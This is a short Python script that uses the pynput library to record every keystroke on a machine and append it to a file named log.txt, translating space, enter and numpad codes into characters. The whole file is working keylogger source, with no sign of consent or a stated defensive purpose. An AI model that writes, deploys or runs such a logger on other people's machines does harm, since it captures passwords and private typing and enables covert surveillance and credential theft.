from pynput.keyboard import Listener


def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r':
        letter = ''
    if letter == 'Key.shift':
        letter = ''
    if letter == "Key.ctrl_l":
        letter = ""
    if letter == "Key.ctrl_r":
        letter = ""
    if letter == "Key.enter":
        letter = "\n"
    #for numpad keys
    if letter == "<110>":
        letter = "."
    if letter == "<96>":
        letter = "0"
    if letter == "<97>":
        letter = "1"
    if letter == "<98>":
        letter = "2"
    if letter == "<99>":
        letter = "3"
    if letter == "<100>":
        letter = "4"
    if letter == "<101>":
        letter = "5"
    if letter == "<102>":
        letter = "6"
    if letter == "<103>":
        letter = "7"
    if letter == "<104>":
        letter = "8"
    if letter == "<105>":
        letter = "9"

    with open("log.txt", 'a') as f:
        f.write(letter)


# Collecting events until stopped
with Listener(on_press=write_to_file) as l:
    l.join()
